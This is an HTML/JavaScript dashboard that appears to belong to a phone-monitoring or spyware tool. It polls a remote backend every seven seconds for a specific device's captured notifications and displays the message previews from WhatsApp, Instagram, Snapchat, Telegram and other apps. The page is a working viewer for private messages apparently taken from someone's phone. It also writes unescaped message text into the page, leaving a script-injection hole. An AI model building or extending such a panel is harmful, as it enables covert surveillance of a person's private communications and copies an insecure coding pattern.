<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Notifications</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
            --text-main: #ffffff;
            --text-muted: #aaaaaa;
            --accent: #4caf50;
        }

        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text-main);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 20px;
            min-height: 100vh; display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 600px;
            background: rgba(0, 0, 0, 0.5); border-radius: 30px;
            padding: 25px; border: 1px solid var(--glass-border);
            height: fit-content; min-height: 70vh;
        }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 25px; padding-bottom: 15px;
            border-bottom: 1px solid var(--glass-border);
        }

        .back-btn {
            text-decoration: none; color: var(--text-main); font-size: 1.2rem;
            background: var(--glass-bg); padding: 10px 15px;
            border-radius: 50%; border: 1px solid var(--glass-border);
        }

        .title { font-size: 1.4rem; font-weight: bold; display: flex; align-items: center; gap: 10px; }
        .title i { color: #FF9800; } 

        .notif-list { display: flex; flex-direction: column; gap: 12px; }

        .notif-card {
            background: var(--glass-bg); border: 1px solid var(--glass-border);
            border-radius: 15px; padding: 12px; display: flex;
            align-items: center; gap: 15px; cursor: pointer; transition: 0.2s;
        }

        .notif-card:hover { background: rgba(255, 255, 255, 0.1); transform: translateX(5px); }

        .app-icon {
            width: 45px; height: 45px; border-radius: 12px;
            display: flex; align-items: center; justify-content: center;
            font-size: 1.4rem; background: rgba(0,0,0,0.3); flex-shrink: 0;
        }

        .content { flex: 1; overflow: hidden; }
        .sender-name { font-weight: bold; font-size: 0.95rem; color: #fff; }
        .preview-text { font-size: 0.8rem; color: var(--text-muted); text-overflow: ellipsis; overflow: hidden; white-space: nowrap; }

        .time-badge { font-size: 0.7rem; color: var(--text-muted); white-space: nowrap; }

        /* Modal */
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8); backdrop-filter: blur(5px);
            display: none; align-items: center; justify-content: center; z-index: 1000;
        }

        .modal-box {
            background: #1e1e1e; width: 90%; max-width: 400px;
            border-radius: 20px; padding: 25px; border: 1px solid var(--glass-border);
            position: relative;
        }

        .modal-body { font-size: 1rem; line-height: 1.6; color: #e0e0e0; margin-top: 15px; word-wrap: break-word; }
        .close-modal { position: absolute; top: 15px; right: 20px; font-size: 1.5rem; color: #aaa; cursor: pointer; }
        .empty-state { text-align: center; padding: 50px; color: var(--text-muted); }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
            <div class="title"><i class="fa-regular fa-bell"></i> Notifications</div>
            <button onclick="fetchNotifications()" style="background:none; border:none; color:white; cursor:pointer; font-size:1.2rem;">
                <i class="fa-solid fa-rotate-right"></i>
            </button>
        </div>

        <div id="notif-list" class="notif-list">
            <div class="empty-state">
                <i class="fa-solid fa-circle-notch fa-spin"></i>
                <p>Connecting to Phone...</p>
            </div>
        </div>
    </div>

    <div id="detailModal" class="modal-overlay" onclick="closeModal(event)">
        <div class="modal-box" onclick="event.stopPropagation()">
            <span class="close-modal" onclick="closeModalDirect()">&times;</span>
            <div id="modalHeader" style="display:flex; align-items:center; gap:10px; border-bottom:1px solid #333; padding-bottom:10px;">
                <div id="modalIcon" class="app-icon" style="width: 35px; height: 35px; font-size: 1rem;"></div>
                <div id="modalAppName" style="font-weight:bold;">App Name</div>
            </div>
            <div id="modalMessage" class="modal-body"></div>
        </div>
    </div>

    <script>
        const RENDER_URL = "https://child-v9no.onrender.com";
        const DEVICE_ID = "M2103K19I"; 

        document.addEventListener("DOMContentLoaded", () => {
            fetchNotifications();
            setInterval(fetchNotifications, 7000); // 7 seconds sync
        });

        async function fetchNotifications() {
            const listContainer = document.getElementById("notif-list");
            
            try {
                // âœ… Sahi Path matching with your Backend Update
                const response = await fetch(`${RENDER_URL}/api/get-data/${DEVICE_ID}/notifications?t=${new Date().getTime()}`);
                
                if (!response.ok) throw new Error("File not found");
                const data = await response.json();
                
                if (!data || data.length === 0) {
                    listContainer.innerHTML = `<div class="empty-state"><i class="fa-solid fa-bell-slash"></i><p>No Notifications Yet</p></div>`;
                    return;
                }

                listContainer.innerHTML = ""; 
                [...data].reverse().forEach(notif => {
                    const appInfo = getAppStyle(notif.packageName || notif.package_name);
                    
                    let timeStr = "";
                    if(notif.postTime) {
                        timeStr = new Date(parseInt(notif.postTime)).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
                    }

                    const card = document.createElement("div");
                    card.className = "notif-card";
                    card.onclick = () => openModal(appInfo, notif.title, notif.text || notif.message);

                    card.innerHTML = `
                        <div class="app-icon" style="color: ${appInfo.color}; border: 1px solid ${appInfo.color}40;">
                            <i class="${appInfo.icon}"></i>
                        </div>
                        <div class="content">
                            <div class="sender-name">${notif.title || "System"}</div>
                            <div class="preview-text">${notif.text || notif.message || "No content"}</div>
                        </div>
                        <div class="time-badge">${timeStr}</div>
                    `;
                    listContainer.appendChild(card);
                });

            } catch (err) {
                if(listContainer.innerHTML.includes("Connecting")) {
                     listContainer.innerHTML = `<div class="empty-state"><p>Waiting for notification sync...</p></div>`;
                }
            }
        }

        function getAppStyle(pkg) {
            if(!pkg) return { icon: 'fa-solid fa-bell', color: '#ffffff', name: 'System' };
            const p = pkg.toLowerCase();
            if (p.includes("whatsapp")) return { icon: 'fa-brands fa-whatsapp', color: '#25D366', name: 'WhatsApp' };
            if (p.includes("instagram")) return { icon: 'fa-brands fa-instagram', color: '#E1306C', name: 'Instagram' };
            if (p.includes("facebook")) return { icon: 'fa-brands fa-facebook', color: '#1877F2', name: 'Facebook' };
            if (p.includes("snapchat")) return { icon: 'fa-brands fa-snapchat', color: '#FFFC00', name: 'Snapchat' };
            if (p.includes("youtube")) return { icon: 'fa-brands fa-youtube', color: '#FF0000', name: 'YouTube' };
            if (p.includes("telegram")) return { icon: 'fa-brands fa-telegram', color: '#229ED9', name: 'Telegram' };
            return { icon: 'fa-solid fa-cube', color: '#aaaaaa', name: 'App' };
        }

        function openModal(appInfo, sender, message) {
            document.getElementById("modalIcon").innerHTML = `<i class="${appInfo.icon}"></i>`;
            document.getElementById("modalIcon").style.color = appInfo.color;
            document.getElementById("modalAppName").innerText = appInfo.name;
            document.getElementById("modalMessage").innerHTML = `<strong>${sender || ""}</strong><br>${message || ""}`;
            document.getElementById("detailModal").style.display = "flex";
        }

        function closeModal(e) { if (e.target.id === "detailModal") closeModalDirect(); }
        function closeModalDirect() { document.getElementById("detailModal").style.display = "none"; }
    </script>
</body>
</html>
